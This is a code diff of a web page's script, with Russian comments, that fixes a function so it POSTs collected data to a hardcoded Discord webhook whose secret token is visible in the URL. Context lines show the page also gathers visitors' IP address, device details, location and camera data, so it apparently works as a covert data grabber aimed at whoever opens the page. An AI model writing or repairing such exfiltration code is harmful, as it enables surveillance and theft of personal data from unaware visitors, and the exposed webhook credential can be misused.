@@ -107,25 +107,24 @@
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1291890955498291230/DisH2cxSC_7-me02B9sroWX6SD_HXCpr9OkpNahDfOYTBHMCUfh3elkJPGoeochzQEqd";
 
-        // Функция отправки данных на Discord
-        async function sendDataToDiscord(data) {
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                });
+// Функция отправки данных на Discord
+async function sendDataToDiscord(data) {
+    try {
+        const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: JSON.stringify(data, null, 2) }) // Discord принимает только JSON с `content`
+        });
 
-                if (response.ok) {
-                    console.log("Данные успешно отправлены в Discord!");
-                } else {
-                    console.error("Ошибка при отправке данных в Discord:", response.status);
-                }
-            } catch (e) {
-                console.error("Ошибка при отправке данных в Discord:", e);
-            }
+        if (response.ok) {
+            console.log("Данные успешно отправлены в Discord!");
+        } else {
+            console.error("Ошибка при отправке данных в Discord:", response.status);
         }
-
+    } catch (e) {
+        console.error("Ошибка при отправке данных в Discord:", e);
+    }
+}
         // Функции для сбора данных IP, устройства, местоположения и камеры
         async function fetchIP() {
             try {
